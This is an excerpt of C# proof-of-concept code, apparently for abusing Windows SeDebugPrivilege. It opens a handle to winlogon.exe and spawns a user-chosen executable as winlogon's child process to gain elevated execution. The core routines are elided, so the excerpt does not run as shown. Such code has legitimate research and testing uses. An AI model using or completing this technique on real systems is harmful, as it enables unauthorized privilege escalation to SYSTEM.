...
namespace SeDebugPrivilegePoC
{
    class SeDebugPrivilegePoC
    {
        ...
        static bool CreateProcessFromHandle(IntPtr hProcess, string filePath)
        {
            int error;
            bool status;
            int size = 0;
        ...
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: SeDebugPrivilegePoC.exe <file_to_execute>");
                Console.WriteLine("Example: SeDebugPrivilegePoC.exe \"C:\\Windows\\System32\\calc.exe\"");
                return;
            }
            ...
            Console.WriteLine("[*] This PoC tries to spawn {0} as a winlogon.exe's child process.", filePath);

            IntPtr hProcess = OpenWinlogonHandle();

            if (hProcess != IntPtr.Zero)
            {
                CreateProcessFromHandle(hProcess, filePath);
